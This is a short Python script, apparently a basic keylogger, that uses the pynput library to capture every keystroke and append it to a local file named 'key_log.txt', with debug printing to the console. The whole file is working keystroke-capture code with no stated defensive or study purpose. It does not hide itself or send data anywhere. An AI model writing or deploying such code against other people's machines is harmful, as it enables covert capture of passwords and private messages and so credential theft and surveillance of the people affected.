from pynput.keyboard import Listener

# Path to save the log file
log_file = "key_log.txt"

# Function to write the key to a file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            key = str(key).replace("'", "")
            if key == 'Key.space':
                file.write(' ')
            elif key == 'Key.enter':
                file.write('\n')
            elif 'Key' in key:
                pass  # Ignore special keys like 'shift', 'ctrl', etc.
            else:
                file.write(key)
    except Exception as e:
        print(f"Error: {e}")  # Catch any file handling errors

# Function to handle key press events
def on_press(key):
    print(f"Key pressed: {key}")  # Debug output to console
    write_to_file(key)  # Save the key to the log file

# Start the listener to capture keystrokes
with Listener(on_press=on_press) as listener:
    listener.join()